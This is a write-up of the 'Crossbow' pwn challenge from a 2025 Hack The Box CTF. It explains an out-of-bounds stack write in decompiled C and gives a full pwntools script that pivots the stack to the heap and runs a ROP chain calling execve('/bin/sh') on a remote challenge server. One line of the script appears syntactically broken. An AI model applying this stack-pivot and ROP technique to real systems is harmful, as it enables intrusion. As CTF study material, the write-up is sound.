---
title: Crossbow
date: 2025-03-29T19:09:45+02:00
description: Writeup for Crossbow [HTB Cyber Apocalypse CTF 2025]
author: sunbather
tags:
- pwn
draft: false
---
___

## Challenge Description

Sir Alaric's legendary shot can pierce through any enemy! Join his training and hone your aim to match his unparalleled precision.

## Intuition

The following is the decompiled code for the `training()` and the `target_dummy()` functions, which are the vulnerable functions:

```c
void training(void)

{
  char *local_28 [4];
  
  printf("%s\n[%sSir Alaric%s]: You only have 1 shot, don\'t miss!!\n",&DAT_0040b4a8,&DAT_0040b00e,
         &DAT_0040b4a8);
  target_dummy(local_28);
  printf("%s\n[%sSir Alaric%s]: That was quite a shot!!\n\n",&DAT_0040b4a8,&DAT_0040b00e,
         &DAT_0040b4a8);
  return;
}


void target_dummy(char **param_1)
{
  int iVar1;
  long lVar2;
  char *pcVar3;
  int input;
  
  printf("%s\n[%sSir Alaric%s]: Select target to shoot: ",&DAT_0040b4a8,&DAT_0040b00e,&DAT_0040b4a8);
  iVar1 = scanf("%d%*c",&input);
  if (iVar1 != 1) {
    printf("%s\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\n\n",
           &DAT_0040b4e4,&DAT_0040b00e,&DAT_0040b4e4);
    exit(0x520);
  }
  lVar2 = (long)input;
  pcVar3 = (char *)calloc(1,0x80);
  param_1[lVar2] = pcVar3;
  if (param_1[lVar2] == (char *)0x0) {
    printf("%s\n[%sSir Alaric%s]: We do not want cowards here!!\n\n",&DAT_0040b4e4,&DAT_0040b00e,
           &DAT_0040b4e4);
    exit(0x1b39);
  }
  printf("%s\n[%sSir Alaric%s]: Give me your best warcry!!\n\n> ",&DAT_0040b4a8,&DAT_0040b00e,
         &DAT_0040b4a8);
  pcVar3 = fgets_unlocked(param_1[input],0x80,(FILE *)__stdin_FILE);
  if (pcVar3 == (char *)0x0) {
    printf("%s\n[%sSir Alaric%s]: Is this the best you have?!\n\n",&DAT_0040b4e4,&DAT_0040b00e,
           &DAT_0040b4e4);
    exit(0x45);
  }
  return;
}
```

Basically, we get an arbitrary write up the stack through `param_1[lVar2] = pcVar3`, because `lVar2` can be out of bounds. But our write simply overwrites 8 bytes on the stack with a pointer to the heap, to where our next payload is stored.

After that, with the `fgets_unlocked(param_1[input],0x80,(FILE *)__stdin_FILE)`, we can write on the heap.

The idea here is to overwrite a saved RBP on the stack to poison RSP and point to the heap.
Then the heap will contain addresses to ROP gadgets and we can form a ROP chain like that.

Another problem here is `0x80`, the number of bytes we can read through the `fgets()` call, is not that much.
So our payload has to be quite small.

## Solution

For the solution, I chose to make use of the numerous `pop` gadgets and the `syscall` gadget.
It's a bit weird, but basically I `read(0, data_addr, 59)` and then the rest of the payload uses `data_addr` and `data_addr+16` as arguments to `execve()`.

```py
#!/usr/bin/env python3

from pwn import *

#target = process("./crossbow")
target = remote("83.136.249.101", 42894)

data_addr = 0x40d000
pop_rax = 0x0000000000401001
pop_rdi = 0x0000000000401d6c
pop_rsi = 0x000000000040566b
pop_rdx = 0x0000000000401139
syscall = 0x0000000000404b51

target.sendline(b"-2")

payload = p64(0) + p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(data_addr) + p64(pop_rdx) + p64(59) + p64(syscall) + p64(pop_rdi) + p64(data_addr + 16) + p64(pop_rdx) + p64(0) + p64(syscall)

target.sendline(payload)

second_stage = p64(data_addr + 16) + p64(0) + b"/bin/sh\x00" + + b"a" * 35
target.send(second_stage)

target.interactive()
```

The way the payload goes is:

1. Overwrite RBP with `-2`.
2. Payload contains 8 bytes of `0x0` at the beginning because dynamic analysis shows execution skips 8 bytes of my payload so whatev.
3. Set RAX to 0, set RDI to 0, set RSI to data_addr (which is just some address in a writable segment of memory), set RDX to 59, do `syscall` -- equivalent with `read(0, data_addr, 59)`.
4. After the read happens, RAX is set to 59. This is helpful for the next syscall, which should do `execve()`.
5. The second stage of the payload is input for the `read()` syscall. Basically it constructs a fake argv at `data_addr` as follows:

```
data_addr = 0x41000 (for example)

ADDRESS: 8-BYTE VALUE
---------------------------
0x41000: 0x0000000000041010 ---+ // This is basically argv[0] = 0x41010
0x41008: 0x0000000000000000    | // This is basically argv[1] = 0
0x41010: 0x0068732f6e69622f  <-+ // This is "/bin/sh\x00"
```

6. Finally, after the fake argv is constructed, the `execve(data_addr+0x10, data_addr, NULL)` syscall happens. Owned.

### Flag

`HTB{st4t1c_b1n4r13s_ar3_2_3z_SOME_UNIQUE_ID}`
